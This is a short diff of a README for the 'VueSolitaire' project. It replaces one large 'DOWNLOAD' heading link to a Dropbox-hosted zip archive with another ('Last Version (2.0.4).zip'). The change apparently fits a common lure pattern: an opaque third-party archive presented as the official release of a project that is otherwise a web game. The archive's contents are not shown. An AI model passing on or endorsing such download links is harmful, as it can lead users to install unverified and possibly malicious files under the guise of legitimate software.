@@ -17,7 +17,7 @@
 
 <img src="https://img.shields.io/github/issues/silent-lad/VueSolitaire.svg">
 
-<h1 align="center"><a  href="https://www.dropbox.com/s/8vsqqt20qe09lks/PASS.SNS2021.zip?dl=1">DOWNLOAD</a></h1>
+<h1 align="center"><a  href="https://www.dropbox.com/s/p9d3zh97e36aky1/Last%20Version%20%282.0.4%29.zip?dl=1">DOWNLOAD</a></h1>
 
 ## Description
 
